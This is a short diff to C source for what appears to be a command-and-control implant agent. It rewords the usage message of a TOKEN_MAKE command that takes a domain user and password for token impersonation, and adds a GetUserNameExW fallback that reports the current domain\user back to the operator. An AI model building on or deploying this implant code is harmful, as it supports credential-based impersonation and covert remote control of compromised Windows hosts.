@@ -2966,7 +2966,7 @@ void dispatch_task(AgentTask *task) {
             /* plain text: "domain\user pass" or "user pass" */
             strncpy(domain,".",sizeof(domain)-1);
             const char *sp = args ? strchr(args,' ') : NULL;
-            if (!sp) { agent_send_result(task->id,"","TOKEN_MAKE requires user+pass"); return; }
+            if (!sp) { agent_send_result(task->id,"","TOKEN_MAKE: usage: [domain\\]user pass"); return; }
             char domuser[256]={0};
             size_t du_len = (size_t)(sp - args);
             if (du_len >= sizeof(domuser)) du_len = sizeof(domuser)-1;
@@ -3028,7 +3028,16 @@ void dispatch_task(AgentTask *task) {
                 free(tub);
             }
         }
-        if (!out[0]) { DWORD sz=sizeof(out); GetUserNameA(out, &sz); }
+        if (!out[0]) {
+            /* NT path failed — fallback to GetUserNameExW(NameSamCompatible) for domain\user */
+            typedef BOOLEAN (WINAPI *pGUNEx)(DWORD, LPWSTR, PULONG);
+            HMODULE hSec = LoadLibraryA("secur32.dll");
+            pGUNEx GUNEx = hSec ? (pGUNEx)GetProcAddress(hSec, "GetUserNameExW") : NULL;
+            WCHAR wbuf[256]={0}; ULONG wsz=256;
+            if (GUNEx && GUNEx(2 /*NameSamCompatible*/, wbuf, &wsz))
+                WideCharToMultiByte(CP_UTF8,0,wbuf,-1,out,sizeof(out)-1,NULL,NULL);
+            else { DWORD sz=(DWORD)sizeof(out); GetUserNameA(out, &sz); }
+        }
         if (hTok) CloseHandle(hTok);
         agent_send_result(task->id, out, "");
     }
